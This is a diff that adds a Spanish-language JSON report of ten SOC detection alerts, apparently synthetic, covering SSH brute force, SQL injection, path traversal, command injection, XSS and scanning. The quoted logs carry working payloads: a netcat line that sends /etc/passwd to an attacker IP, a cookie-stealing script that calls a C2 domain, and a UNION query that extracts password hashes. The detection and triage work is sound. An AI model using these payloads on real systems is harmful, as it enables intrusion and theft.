@@ -1,0 +1,195 @@
+{
+  "generated_at": "2026-11-09T00:45:05.365358+00:00",
+  "analyst": "GabrielMartinez97",
+  "total_alerts": 10,
+  "alerts": [
+    {
+      "rule_id": "SOC-SSH-003",
+      "title": "COMPROMISO DE CUENTA: Login SSH Exitoso tras Fuerza Bruta",
+      "severity": "CRITICAL",
+      "mitre_tactic": "Initial Access / Persistence",
+      "mitre_technique_id": "T1078",
+      "mitre_technique_name": "Valid Accounts",
+      "source_ip": "185.220.101.45",
+      "target_Asset_or_uri": "prod-bastion-01 (user: backup_svc)",
+      "outcome": "SUCCESSFUL_EXPLOITATION",
+      "description": "¡ALERTA CRÍTICA! Tras 8 intentos fallidos de fuerza bruta, la IP 185.220.101.45 logró autenticarse exitosamente (Accepted password) con el usuario 'backup_svc' en el servidor 'prod-bastion-01'.",
+      "evidence_logs": [
+        "Nov 08 08:20:21 prod-bastion-01 sshd[1224]: Failed password for invalid user postgres from 185.220.101.45 port 44106 ssh2",
+        "Nov 08 08:20:23 prod-bastion-01 sshd[1227]: Failed password for backup_svc from 185.220.101.45 port 44107 ssh2",
+        "Nov 08 08:20:25 prod-bastion-01 sshd[1230]: Failed password for backup_svc from 185.220.101.45 port 44108 ssh2",
+        "Nov 08 08:20:28 prod-bastion-01 sshd[1235]: Accepted password for backup_svc from 185.220.101.45 port 44109 ssh2"
+      ],
+      "recommended_action": "ESCALAR INMEDIATAMENTE A SOC L2 / IR: 1) Desconectar sesión activa del usuario 'backup_svc', 2) Rotar credenciales, 3) Aislar el host 'prod-bastion-01' y auditar comandos ejecutados post-compromiso.",
+      "defanged_source_ip": "185.220.101[.]45"
+    },
+    {
+      "rule_id": "SOC-WEB-002",
+      "title": "Ataque de SQL Injection (SQLi) Detectado",
+      "severity": "CRITICAL",
+      "mitre_tactic": "Initial Access",
+      "mitre_technique_id": "T1190",
+      "mitre_technique_name": "Exploit Public-Facing Application",
+      "source_ip": "198.51.100.77",
+      "target_Asset_or_uri": "/products?id=10' OR '1'='1",
+      "outcome": "SUCCESSFUL_EXPLOITATION (HTTP 200 - 8490 bytes enviados)",
+      "description": "Se detectó un payload de inyección SQL desde 198.51.100.77 hacia '/products?id=10' OR '1'='1'. El servidor respondió con código HTTP 200 y 8490 bytes.",
+      "evidence_logs": [
+        "198.51.100.77 - - [08/Nov/2026:09:15:20 +0000] \"GET /products?id=10'%20OR%20'1'='1 HTTP/1.1\" 200 8490 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\""
+      ],
+      "recommended_action": "ESCALAR A SOC L2: El servidor devolvió HTTP 200 con alto volumen de bytes (posible exfiltración de tabla de usuarios). Revisar base de datos y activar regla WAF.",
+      "defanged_source_ip": "198.51.100[.]77"
+    },
+    {
+      "rule_id": "SOC-WEB-002",
+      "title": "Ataque de SQL Injection (SQLi) Detectado",
+      "severity": "CRITICAL",
+      "mitre_tactic": "Initial Access",
+      "mitre_technique_id": "T1190",
+      "mitre_technique_name": "Exploit Public-Facing Application",
+      "source_ip": "198.51.100.77",
+      "target_Asset_or_uri": "/products?id=-1 UNION SELECT 1,username,password_hash FROM users--",
+      "outcome": "SUCCESSFUL_EXPLOITATION (HTTP 200 - 12450 bytes enviados)",
+      "description": "Se detectó un payload de inyección SQL desde 198.51.100.77 hacia '/products?id=-1 UNION SELECT 1,username,password_hash FROM users--'. El servidor respondió con código HTTP 200 y 12450 bytes.",
+      "evidence_logs": [
+        "198.51.100.77 - - [08/Nov/2026:09:15:24 +0000] \"GET /products?id=-1%20UNION%20SELECT%201,username,password_hash%20FROM%20users-- HTTP/1.1\" 200 12450 \"-\" \"sqlmap/1.8.4#stable (https://sqlmap.org)\""
+      ],
+      "recommended_action": "ESCALAR A SOC L2: El servidor devolvió HTTP 200 con alto volumen de bytes (posible exfiltración de tabla de usuarios). Revisar base de datos y activar regla WAF.",
+      "defanged_source_ip": "198.51.100[.]77"
+    },
+    {
+      "rule_id": "SOC-WEB-003",
+      "title": "Intento de Path Traversal / Local File Inclusion (LFI)",
+      "severity": "CRITICAL",
+      "mitre_tactic": "Initial Access / Collection",
+      "mitre_technique_id": "T1083",
+      "mitre_technique_name": "File and Directory Discovery",
+      "source_ip": "198.51.100.77",
+      "target_Asset_or_uri": "/download?file=../../../../etc/passwd",
+      "outcome": "SUCCESSFUL_EXPLOITATION (HTTP 200 - 2841 bytes enviados)",
+      "description": "La IP 198.51.100.77 intentó leer archivos del sistema operativo mediante secuencias de salto de directorio ('/download?file=../../../../etc/passwd'). Respuesta del servidor: HTTP 200 (2841 bytes).",
+      "evidence_logs": [
+        "198.51.100.77 - - [08/Nov/2026:09:16:05 +0000] \"GET /download?file=../../../../etc/passwd HTTP/1.1\" 200 2841 \"-\" \"curl/8.5.0\""
+      ],
+      "recommended_action": "ESCALAR A SOC L2: El servidor respondió HTTP 200 OK (el archivo fue leído por el atacante). Parchear endpoint vulnerable y bloquear IP.",
+      "defanged_source_ip": "198.51.100[.]77"
+    },
+    {
+      "rule_id": "SOC-WEB-005",
+      "title": "Intento de Ejecución Remota de Comandos (OS Command Injection)",
+      "severity": "CRITICAL",
+      "mitre_tactic": "Execution",
+      "mitre_technique_id": "T1059.004",
+      "mitre_technique_name": "Command and Scripting Interpreter: Unix Shell",
+      "source_ip": "203.0.113.88",
+      "target_Asset_or_uri": "/cmd?exec=;cat /etc/passwd|nc 203.0.113.88 4444",
+      "outcome": "BLOCKED_OR_FAILED (HTTP 500)",
+      "description": "La IP 203.0.113.88 intentó inyectar comandos de sistema y establecer una Reverse Shell con netcat ('/cmd?exec=;cat /etc/passwd|nc 203.0.113.88 4444'). Código HTTP: 500.",
+      "evidence_logs": [
+        "203.0.113.88 - - [08/Nov/2026:09:22:45 +0000] \"GET /cmd?exec=;cat%20/etc/passwd|nc%20203.0.113.88%204444 HTTP/1.1\" 500 512 \"-\" \"python-requests/2.31.0\""
+      ],
+      "recommended_action": "Verificar conexiones salientes hacia la IP atacante en el puerto 4444 y aislar el servidor web si existe proceso hijo de shell activo.",
+      "defanged_source_ip": "203.0.113[.]88"
+    },
+    {
+      "rule_id": "SOC-SSH-002",
+      "title": "SSH Password Spraying Detectado",
+      "severity": "HIGH",
+      "mitre_tactic": "Credential Access",
+      "mitre_technique_id": "T1110.003",
+      "mitre_technique_name": "Brute Force: Password Spraying",
+      "source_ip": "45.155.205.109",
+      "target_Asset_or_uri": "prod-bastion-01",
+      "outcome": "FAILED_ATTEMPT",
+      "description": "La IP 45.155.205.109 realizó 6 intentos fallidos probando 6 usuarios distintos (deploy, devops, guest, jenkins, support, test) para evitar bloqueos por cuenta.",
+      "evidence_logs": [
+        "Nov 08 08:31:10 prod-bastion-01 sshd[1401]: Failed password for invalid user guest from 45.155.205.109 port 59011 ssh2",
+        "Nov 08 08:31:14 prod-bastion-01 sshd[1404]: Failed password for invalid user test from 45.155.205.109 port 59012 ssh2",
+        "Nov 08 08:31:18 prod-bastion-01 sshd[1408]: Failed password for invalid user deploy from 45.155.205.109 port 59013 ssh2",
+        "Nov 08 08:31:22 prod-bastion-01 sshd[1412]: Failed password for invalid user devops from 45.155.205.109 port 59014 ssh2",
+        "Nov 08 08:31:26 prod-bastion-01 sshd[1416]: Failed password for invalid user support from 45.155.205.109 port 59015 ssh2",
+        "Nov 08 08:31:30 prod-bastion-01 sshd[1420]: Failed password for invalid user jenkins from 45.155.205.109 port 59016 ssh2"
+      ],
+      "recommended_action": "Bloquear IP en firewall perimetral y verificar que las cuentas enumeradas no existan o tengan MFA / autenticación por llave pública obligatoria.",
+      "defanged_source_ip": "45.155.205[.]109"
+    },
+    {
+      "rule_id": "SOC-WEB-003",
+      "title": "Intento de Path Traversal / Local File Inclusion (LFI)",
+      "severity": "HIGH",
+      "mitre_tactic": "Initial Access / Collection",
+      "mitre_technique_id": "T1083",
+      "mitre_technique_name": "File and Directory Discovery",
+      "source_ip": "198.51.100.77",
+      "target_Asset_or_uri": "/download?file=../../../../etc/shadow",
+      "outcome": "BLOCKED_OR_FAILED (HTTP 403)",
+      "description": "La IP 198.51.100.77 intentó leer archivos del sistema operativo mediante secuencias de salto de directorio ('/download?file=../../../../etc/shadow'). Respuesta del servidor: HTTP 403 (162 bytes).",
+      "evidence_logs": [
+        "198.51.100.77 - - [08/Nov/2026:09:16:09 +0000] \"GET /download?file=..%2F..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1\" 403 162 \"-\" \"curl/8.5.0\""
+      ],
+      "recommended_action": "El servidor bloqueó la lectura (HTTP 403/404). Monitorear y bloquear IP en WAF.",
+      "defanged_source_ip": "198.51.100[.]77"
+    },
+    {
+      "rule_id": "SOC-WEB-004",
+      "title": "Ataque Cross-Site Scripting (XSS) Detectado",
+      "severity": "HIGH",
+      "mitre_tactic": "Initial Access",
+      "mitre_technique_id": "T1189",
+      "mitre_technique_name": "Drive-by Compromise",
+      "source_ip": "203.0.113.88",
+      "target_Asset_or_uri": "/search?q=<script>fetch('http://c2.attacker-domain.xyz/collect?c='+document.cookie)</script>",
+      "outcome": "SUCCESSFUL_EXPLOITATION (HTTP 200 - 3102 bytes enviados)",
+      "description": "Se detectó inyección de script malicioso orientado a robo de sesión/cookies desde 203.0.113.88 en '/search?q=<script>fetch('http://c2.attacker-domain.xyz/collect?c='+document.cookie)</script>'.",
+      "evidence_logs": [
+        "203.0.113.88 - - [08/Nov/2026:09:22:11 +0000] \"GET /search?q=<script>fetch('http://c2.attacker-domain.xyz/collect?c='+document.cookie)</script> HTTP/1.1\" 200 3102 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0\""
+      ],
+      "recommended_action": "Bloquear dominio de comando y control (C2) referenciado en el script y sanitizar entrada.",
+      "defanged_source_ip": "203.0.113[.]88"
+    },
+    {
+      "rule_id": "SOC-SSH-001",
+      "title": "Ataque de Fuerza Bruta SSH",
+      "severity": "MEDIUM",
+      "mitre_tactic": "Credential Access",
+      "mitre_technique_id": "T1110.001",
+      "mitre_technique_name": "Brute Force: Password Guessing",
+      "source_ip": "185.220.101.45",
+      "target_Asset_or_uri": "prod-bastion-01",
+      "outcome": "FAILED_ATTEMPT",
+      "description": "La IP 185.220.101.45 generó 8 intentos de inicio de sesión fallidos contra el host prod-bastion-01 (usuarios atacados: admin, backup_svc, oracle, postgres, root, ubuntu).",
+      "evidence_logs": [
+        "Nov 08 08:20:11 prod-bastion-01 sshd[1210]: Failed password for invalid user admin from 185.220.101.45 port 44101 ssh2",
+        "Nov 08 08:20:13 prod-bastion-01 sshd[1212]: Failed password for root from 185.220.101.45 port 44102 ssh2",
+        "Nov 08 08:20:15 prod-bastion-01 sshd[1215]: Failed password for root from 185.220.101.45 port 44103 ssh2",
+        "Nov 08 08:20:17 prod-bastion-01 sshd[1218]: Failed password for invalid user ubuntu from 185.220.101.45 port 44104 ssh2",
+        "Nov 08 08:20:19 prod-bastion-01 sshd[1221]: Failed password for invalid user oracle from 185.220.101.45 port 44105 ssh2",
+        "Nov 08 08:20:21 prod-bastion-01 sshd[1224]: Failed password for invalid user postgres from 185.220.101.45 port 44106 ssh2",
+        "Nov 08 08:20:23 prod-bastion-01 sshd[1227]: Failed password for backup_svc from 185.220.101.45 port 44107 ssh2",
+        "Nov 08 08:20:25 prod-bastion-01 sshd[1230]: Failed password for backup_svc from 185.220.101.45 port 44108 ssh2"
+      ],
+      "recommended_action": "Verificar si la IP pertenece a una red conocida; de lo contrario, agregar a lista de bloqueo (Blacklist / Fail2Ban).",
+      "defanged_source_ip": "185.220.101[.]45"
+    },
+    {
+      "rule_id": "SOC-WEB-001",
+      "title": "Escaneo Automatizado de Vulnerabilidades (Nikto / Nmap)",
+      "severity": "MEDIUM",
+      "mitre_tactic": "Reconnaissance",
+      "mitre_technique_id": "T1595.002",
+      "mitre_technique_name": "Active Scanning: Vulnerability Scanning",
+      "source_ip": "91.240.118.222",
+      "target_Asset_or_uri": "Múltiples rutas (/phpmyadmin/index.php, /.env, /wp-config.php.bak, /server-status)",
+      "outcome": "RECONNAISSANCE_BLOCKED (HTTP 403/404)",
+      "description": "Se detectó reconocimiento activo con herramientas automatizadas (Nikto/Nmap) desde la IP 91.240.118.222 realizando 4 peticiones a rutas sensibles (/phpmyadmin/index.php, /.env, /wp-config.php.bak, /server-status).",
+      "evidence_logs": [
+        "91.240.118.222 - - [08/Nov/2026:09:10:01 +0000] \"GET /phpmyadmin/index.php HTTP/1.1\" 404 153 \"-\" \"Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)\"",
+        "91.240.118.222 - - [08/Nov/2026:09:10:02 +0000] \"GET /.env HTTP/1.1\" 404 153 \"-\" \"Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006452)\"",
+        "91.240.118.222 - - [08/Nov/2026:09:10:03 +0000] \"GET /wp-config.php.bak HTTP/1.1\" 404 153 \"-\" \"Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006499)\"",
+        "91.240.118.222 - - [08/Nov/2026:09:10:04 +0000] \"GET /server-status HTTP/1.1\" 403 162 \"-\" \"Scanner/Nmap NSE\""
+      ],
+      "recommended_action": "Bloquear IP en firewall/WAF por reconocimiento activo; confirmar que ninguna ruta sensible (.env, phpmyadmin, backups) haya respondido con código 200.",
+      "defanged_source_ip": "91.240.118[.]222"
+    }
+  ]
+}
